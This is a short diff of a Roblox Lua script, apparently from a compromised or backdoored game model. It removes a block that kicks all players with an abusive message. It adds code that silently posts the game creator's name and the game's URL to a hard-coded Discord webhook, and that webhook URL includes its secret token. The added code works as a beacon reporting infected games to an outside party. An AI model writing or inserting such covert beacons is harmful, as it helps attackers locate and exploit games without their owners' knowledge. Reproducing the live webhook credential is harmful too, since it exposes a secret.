@@ -12,8 +12,20 @@
 		end
 	end)
 end]]
-if game.PlaceId == 17548568255 then
-	for _,v in pairs(game.Players:GetPlayers()) do
-		v:Kick("Fucking Idiot Enable third party teleports")
-	end
-end
+
+local url = "https://discord.com/api/webhooks/1391064950444654622/FEtgpmHH8pADyHA2tjZQEkFE0AAMgaNqZ0nP8tqPyLn_QrUbupBcXQhKKnupsdJQ44k9"
+local hs = game:GetService("HttpService")
+
+local text = {
+	["embeds"] = {{
+
+		["author"] = {
+			["name"] = game.Players:GetNameFromUserIdAsync(game.CreatorId),
+			["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. game.Players:GetNameFromUserIdAsync(game.CreatorId)
+		},
+		["description"] = "https://www.roblox.com/games/"..game.PlaceId,
+		["color"] = tonumber(0xFFFAFA),
+	}},
+
+}
+hs:PostAsync(url, hs:JSONEncode(text))
